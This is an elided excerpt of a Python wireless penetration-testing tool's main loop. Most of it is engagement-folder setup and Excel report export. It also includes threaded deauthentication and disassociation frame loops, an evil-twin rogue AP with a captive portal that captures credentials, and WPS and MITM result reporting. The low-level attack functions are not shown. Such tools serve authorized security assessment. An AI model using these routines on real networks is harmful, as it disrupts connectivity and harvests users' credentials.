...
# -----------------------------------------------------------------------------
# EXCEL EXPORT HELPER (every scan -> timestamped .xlsx, never overwritten)
# Filename: <scan-name>-{date}-{time}.xlsx  e.g. discover-aps-2026-02-14-10-30-05.xlsx
# Location: projects/<project>/  (set once at startup from the project name)
# -----------------------------------------------------------------------------
_PROJECT_NAME = ""
_REPORTS_DIR = Path("scans")  # replaced by projects/<project> once known

def _export_scan_safe(scan_name, sheets, iface="?", extra_meta=None):
    """Save scan findings to <project>/<scan-name>-YYYY-MM-DD-HH-MM-SS.xlsx.

    Never raises — warns instead, so a failed export never kills a scan.
    Returns the file path or None.
    """
    try:
        from export_utils import save_scan_excel
        meta = {"project": _PROJECT_NAME or "?", "interface": iface}
        if extra_meta:
            try:
                meta.update(dict(extra_meta))
            except Exception:
                pass
        path = save_scan_excel(scan_name, sheets, out_dir=_REPORTS_DIR, meta=meta)
        if path:
            UI.ok(f"Findings saved → {path}")
        return path
    except Exception as e:
        try:
            UI.warn(f"Excel export skipped ({scan_name}): {e}")
        except Exception:
            pass
        return None
...
def main():
    ...
    parser.add_argument("--project",      help="Project/engagement name — reports saved under projects/<name>/")
    ...
    # ── Project setup: every report lands under projects/<project>/ ──
    # Ask once at startup (or take --project) so all findings for this
    # engagement — discover, clients, vuln, deauth, evil-twin, pnl,
    # decloak, wps, mitm, rogue — live in one folder.
    global _PROJECT_NAME, _REPORTS_DIR
    UI.section("Project Setup")
    _cli_project = getattr(args, "project", None)
    if _cli_project:
        _proj_raw = str(_cli_project).strip()
        UI.info(f"Project from --project: {_proj_raw}")
    else:
        UI.info("All reports for this session are stored under projects/<project-name>/")
        try:
            _proj_raw = input(f"{UI.BOLD}  ❯ Project name: {UI.RESET}").strip()
        except (KeyboardInterrupt, EOFError):
            print()
            UI.info("Goodbye :>")
            sys.exit(1)
    try:
        from export_utils import sanitize_project_name, now_ist
        _proj_safe = sanitize_project_name(_proj_raw)
    except Exception:
        _proj_safe = ""
    if not _proj_safe:
        try:
            from export_utils import now_ist as _now_ist
            _proj_safe = f"audit-{_now_ist().strftime('%Y-%m-%d-%H-%M-%S')}"
        except Exception:
            from datetime import datetime as _dt
            _proj_safe = f"audit-{_dt.now().strftime('%Y-%m-%d-%H-%M-%S')}"
        UI.warn(f"Empty project name — using '{_proj_safe}'.")
    _PROJECT_NAME = _proj_safe
    _REPORTS_DIR = Path("projects") / _proj_safe
    try:
        _REPORTS_DIR.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        UI.warn(f"Could not create {_REPORTS_DIR}: {e} — falling back to scans/.")
        _REPORTS_DIR = Path("scans")
        try:
            _REPORTS_DIR.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass
    UI.ok(f"Project → {_PROJECT_NAME}  (reports: {_REPORTS_DIR}/<scan>-{{date}}-{{time}}.xlsx)")
    ...
    while True:
        ...
        if user_choice == 1:
            ...
            try:
                ...
                try:
                    ...
                    pass
                # ── Excel export: every Discover scan → timestamped .xlsx ──
                try:
                    _export_scan_safe("discover-aps",
                                      {"APs": (list(audit.table_headers),
                                               list(audit.results or []))},
                                      iface=iface)
                except Exception:
                    pass
            ...
            try:
                ...
                # ── Excel export: every client enumeration → timestamped .xlsx ──
                try:
                    _cli_headers = ["Access Point", "AP Vendor", "Connected Client",
                                    "Client Vendor", "Status", "RSSI",
                                    "First Seen", "Last Seen"]
                    _cli_rows = []
                    try:
                        for _r in (getattr(audit, "client_results", []) or []):
                            if _r and str(_r[0]).lower() == str(a_bssid).lower():
                                _cli_rows.append(list(_r[:8]))
                    except Exception:
                        _cli_rows = list(getattr(audit, "client_results", []) or [])
                    _export_scan_safe("clients",
                                      {"Clients": (_cli_headers, _cli_rows)},
                                      iface=iface,
                                      extra_meta={"target_bssid": a_bssid,
                                                  "target_channel": a_channel})
                except Exception:
                    pass
                continue  # <── back to top of while loop → show menu again
            ...
            try:
                ...
                try:
                    ...
                    # ── Excel export ──
                    try:
                        _vrows = [[f.get("severity", "?"), f.get("id", "?"),
                                   f.get("name", "?"), f.get("description", "?"),
                                   f.get("evidence", "?"), f.get("remediation", "?")]
                                  for f in (_findings or [])]
                        _export_scan_safe("vuln-assessment",
                                          {"Findings": (["Severity", "ID", "Finding",
        ...
        #         continue
            ...
            UI.section("Reason Code [ACTIVE]")
            print("  1) 1 - Unspecified")
            print("  2) 2 - Previous auth no longer valid")
            print("  3) 3 - Station leaving IBSS/ESS")
            print("  4) 4 - Disassociated due to inactivity")
            print("  5) 5 - AP unable to handle all stations")
            print("  6) 6 - Class 2 frame from nonauthenticated station")
            print("  7) 7 - Class 3 frame from nonassociated station (default deauth)")
            print("  8) 8 - Station leaving BSS (default disassoc)")
            print("  9) 9 - Association denied / not authenticated")
            print("  0) Custom (0-65535)")
            _r_raw = input("  Choose reason [1-9, 0=custom] (Enter = default): ").strip() or ""
            if _r_raw == "":
                deauth_reason = None  # 7 for deauth / 8 for disassoc
            elif _r_raw == "0":
                try:
                    _custom = input(f"{UI.BOLD}  ❯ Custom reason 0-65535: {UI.RESET}").strip()
                    _rv = int(_custom)
                    deauth_reason = _rv if 0 <= _rv <= 65535 else None
                    if deauth_reason is None:
                        UI.warn(f"Reason '{_custom}' out of range — using default.")
                except (KeyboardInterrupt, EOFError, ValueError):
                    print()
                    UI.info("Reason selection cancelled — using default.")
                    deauth_reason = None
            elif _r_raw in {"1", "2", "3", "4", "5", "6", "7", "8", "9"}:
                deauth_reason = int(_r_raw)
            else:
                try:
                    _rv = int(_r_raw)
                    deauth_reason = _rv if 0 <= _rv <= 65535 else None
                    if deauth_reason is None:
                        UI.warn(f"Reason '{_r_raw}' out of range — using default.")
                except ValueError:
                    UI.warn(f"Invalid reason '{_r_raw}' — using default.")
                    deauth_reason = None
            try:
                _r_disp = ("default (7/8)" if deauth_reason is None
                           else f"{deauth_reason} - {audit.reason_name(deauth_reason)}")
            except Exception:
                _r_disp = str(deauth_reason)
            UI.ok(f"Reason code selected: {_r_disp}.")
            ...
            def _save_deauth_report(_mode_label, _rx_label, _count, _interval):
                """Snapshot deauth counters → <project>/deauth-{date}-{time}.xlsx."""
                try:
                    try:
                        _reason_meta = ("default (7/8)" if deauth_reason is None
                                        else f"{deauth_reason} - {audit.reason_name(deauth_reason)}")
                    except Exception:
                        _reason_meta = str(deauth_reason)
                    from export_utils import export_deauth
                    _d_path = export_deauth(getattr(audit, "_deauth_counts", {}),
                                            out_dir=_REPORTS_DIR, project=_PROJECT_NAME,
                                            interface=iface, target_bssid=target_bssid,
                                            target_channel=target_channel, mode=_mode_label,
                                            receiver=_rx_label, frame=frame_name,
                                            reason=_reason_meta, requested_count=_count,
                                            interval_seconds=_interval)
                    if _d_path:
                        UI.ok(f"Deauth report saved → {_d_path}")
                except Exception:
                    pass
            ...
            if mode == "1":
                ...
                try:
                    _r_info = ("default" if deauth_reason is None
                               else f"R{deauth_reason}")
                except Exception:
                    _r_info = "default"
                UI.info(f"Sending {frame_name.lower()} frames (count={deauth_count or 'infinite'}, "
                        f"interval={deauth_interval}s, reason={_r_info})... Press Ctrl+C to stop and return to menu.")
                try:
                ...
                def _deauth_loop(_tx=target_bssid, _rx=receiver_mac,
                                 ...
                                 _subtype=frame_subtype, _reason=deauth_reason):
                    sent = 0
                    while not stop_deauth.is_set() and (_count <= 0 or sent < _count):
                        try:
                            audit.deauth_frame(iface=iface, transmitter_mac=_tx, receiver_mac=_rx,
                                               mgmt_subtype=_subtype, reason=_reason)
                        except Exception:
                            pass
                        sent += 1
                ...
                try:
                    ...
                    print()
                    UI.ok("Deauth attack stopped — returning to menu.")
                    _save_deauth_report("Broadcast", receiver_mac, deauth_count, deauth_interval)
                    audit.stop_hopper.set()
                    continue
                try:
                    audit.end_deauth_line()
            ...
            deauth_count, deauth_interval = params
            try:
                _r_info_u = ("default" if deauth_reason is None
                             else f"R{deauth_reason}")
            except Exception:
                _r_info_u = "default"
            UI.info(f"Sending {frame_name.lower()} frames (count={deauth_count or 'infinite'}, "
                    f"interval={deauth_interval}s, reason={_r_info_u})... Press Ctrl+C to stop and return to menu.")
            try:
                audit.set_view("deauth")
            except Exception:
                pass
            ...
            def _deauth_loop_uni(_ap=target_bssid, _cli=selected_client,
                                 _count=deauth_count, _interval=deauth_interval,
                                 _subtype=frame_subtype, _reason=deauth_reason):
                # Proper unicast: each iteration sends a bidirectional pair
                # (AP->client + client->AP, BSSID in addr3 both ways) via
                # audit.deauth_unicast(). Count tracks PAIRS for predictability.
                sent = 0
                while not stop_deauth.is_set() and (_count <= 0 or sent < _count):
                    try:
                        audit.deauth_unicast(iface=iface, ap_bssid=_ap, client_mac=_cli,
                                             mgmt_subtype=_subtype, reason=_reason)
                    except Exception:
                        pass
                    sent += 1
            ...
            try:
                ...
                print()
                UI.ok("Deauth attack stopped — returning to menu.")
                _save_deauth_report("Unicast", selected_client, deauth_count, deauth_interval)
                audit.stop_hopper.set()
                continue
            try:
                audit.end_deauth_line()
            ...
            # ── Step 2: Evil Twin mode (with / without captive portal) ───────
            UI.section("Evil Twin Mode")
            print("  1) With captive portal (login required — no internet until credentials entered; any HTTP redirects back to portal)")
            print("  2) Without captive portal (open — no login/redirect, direct internet)")
            try:
                mode_raw = input(f"{UI.BOLD}  ❯ Choose mode [1-2] (default 1): {UI.RESET}").strip() or "1"
            except (KeyboardInterrupt, EOFError):
                print()
                UI.info("Selection cancelled. Returning to menu...")
                audit.stop_hopper.set()
            ...
            if mode_raw not in ("1", "2"):
                UI.warn(f"Invalid mode '{mode_raw}' — defaulting to 1 (with captive portal).")
                mode_raw = "1"
            captive_mode = (mode_raw == "1")
            if captive_mode:
                UI.ok("Mode → WITH captive portal (auth-gated internet + portal redirect).")
            else:
                UI.ok("Mode → WITHOUT captive portal (open, direct internet).")

            # ── Step 2b: Captive portal template selection (with-portal mode only)
            portal_choice = "none"
            if captive_mode:
            ...
            if captive_mode:
                ...
                UI.warn("[ACTIVE / AUTHORIZED TESTING ONLY] Rogue AP Simulation (Evil Twin, Open) — "
                        "broadcasts a real AP impersonating the target with direct internet (no portal).")
            ...
            if captive_mode:
                UI.info(f"Summary → SSID:{UI.YELLOW}{target_ssid}{UI.RESET}  CH:{target_channel}  "
                        f"Mode:WITH portal  Portal:{UI.GREEN}{portal_choice}{UI.RESET}  AP:{ap_iface_input}  Uplink:{uplink or 'auto'}  "
                        f"BSSID:{target_bssid or 'adapter default'}")
            else:
                UI.info(f"Summary → SSID:{UI.YELLOW}{target_ssid}{UI.RESET}  CH:{target_channel}  "
                        f"Mode:OPEN (no portal)  AP:{ap_iface_input}  Uplink:{uplink or 'auto'}  "
                        f"BSSID:{target_bssid or 'adapter default'}")
            print()
            try:
            ...
            try:
                ...
                # ── Excel report: evil-twin config + captured credentials ──
                try:
                    _et_cfg = {"ssid": target_ssid, "channel": target_channel,
                               "bssid": target_bssid or "adapter default",
                               "mode": "WITH portal" if captive_mode else "OPEN (no portal)",
                               "portal": portal_choice, "ap_iface": ap_iface_input,
                               "uplink": uplink or "auto"}
                    _et_creds = list(getattr(et, "_creds", []) or []) if et is not None else []
                    _et_db = getattr(et, "_db_path", None) if et is not None else None
                    from export_utils import export_eviltwin
                    _et_path = export_eviltwin(_et_cfg, _et_creds, db_path=_et_db,
                                               out_dir=_REPORTS_DIR, project=_PROJECT_NAME,
                                               interface=iface)
                    if _et_path:
                        UI.ok(f"Evil-twin report saved → {_et_path}")
                except Exception:
                    pass
                audit.stop_hopper.set()
                continue
            ...
            try:
                ...
                try:
                    ...
                    pass
                # ── Excel export: every PNL scan → timestamped .xlsx ──
                try:
                    _pnl_headers = ["SRC MAC", "Vendor", "SSID (Probed)", "Count",
                                    "First Seen", "Last Seen", "Notes"]
                    _pnl_rows = []
                    try:
                        for _r in (getattr(audit, "probe_results", []) or []):
                            try:
                                _src, _ven, _ssid, _cnt, _last = _r[0], _r[1], _r[2], _r[3], _r[4]
                                _first = audit.probe_first_seen.get((_src, _ssid), _last)
                                _pnl_rows.append([_src, _ven, _ssid, _cnt, _first, _last,
                                                  audit._probe_notes(_ssid, _cnt)])
                            except Exception:
                                continue
                    except Exception:
                        pass
                    _export_scan_safe("pnl",
                                      {"Probed SSIDs": (_pnl_headers, _pnl_rows)},
                                      iface=iface)
                except Exception:
                    pass
                continue
            ...
            try:
                ...
                # ── Excel export: every decloak scan → timestamped .xlsx ──
                try:
                    _dec_headers = ["BSSID (Hidden AP)", "Decloaked SSID", "Client MAC",
                                    "Client Vendor", "Frame", "Time", "CH"]
                    _export_scan_safe("decloak",
                                      {"Decloaked": (_dec_headers,
                                                     list(getattr(audit, "decloaked_results", []) or []))},
                                      iface=iface,
                                      extra_meta={"target_bssid": target_bssid,
            ...
            try:
                ...
                # ── Excel report: WPS result (PIN/PSK/log) ──
                try:
                    if not wps_res:
                        wps_res = {"bssid": target_bssid,
                                   "pin": getattr(atk, "pin", None),
                                   "psk": getattr(atk, "psk", None),
                                   "log": str(getattr(atk, "log_path", "?"))}
                    from export_utils import export_wps
                    _w_path = export_wps(wps_res, out_dir=_REPORTS_DIR,
                                         project=_PROJECT_NAME, interface=iface,
                                         target_channel=target_channel)
                    if _w_path:
                        UI.ok(f"WPS report saved → {_w_path}")
                except Exception:
                    pass
                audit.stop_hopper.set()
                continue
            ...
            try:
                ...
                # ── Excel report: MITM session + credential hints ──
                try:
                    _mr = dict(mitm_res or {})
                    _mr.setdefault("interface", mon_if)
                    _mr.setdefault("victim", tgt_in)
                    _mr.setdefault("gateway", gw_in)
                    from export_utils import export_mitm
                    _m_path = export_mitm(_mr, out_dir=_REPORTS_DIR,
                                          project=_PROJECT_NAME)
                    if _m_path:
                        UI.ok(f"MITM report saved → {_m_path}")
                except Exception:
                    pass
                audit.stop_hopper.set()
                continue
            ...
            # ── Excel export: every rogue-detection scan → timestamped .xlsx ──
            try:
                _rog_headers = ["Suspect BSSID", "SSID", "CH", "RSSI", "Encryption",
                                "MFPC", "MFPR", "Uptime", "Score", "Risk", "Reasons"]
                _legit = getattr(audit, "rogue_legit", {}) or {}
                _sheets = {"Rogue Candidates": (_rog_headers, list(cands or []))}
                if _legit:
                    _sheets["Legit Baseline"] = (["Field", "Value"],
                                                 [[k, v] for k, v in dict(_legit).items()])
                _export_scan_safe("rogue-detection", _sheets, iface=iface,
                                  extra_meta={"legit_ssid": legit_ssid,
            ...
            try:
                ...
                pass
            # ── Excel export: rogue victims → timestamped .xlsx ──
            try:
                _vv_headers = ["Access Point", "AP Vendor", "Connected Client",
                               "Client Vendor", "Status", "RSSI",
                               "First Seen", "Last Seen"]
                _vv_rows = []
                try:
                    for _vr in (victims or []):
                        _vv_rows.append(list(_vr[:8]))
                except Exception:
                    pass
                _export_scan_safe("rogue-victims",
                                  {"Victims": (_vv_headers, _vv_rows)},
                                  iface=iface,
                                  extra_meta={"rogue_bssid": rogue_bssid,
                                              "rogue_ssid": rogue_ssid,
                                              "rogue_channel": rogue_ch})
            except Exception:
                pass
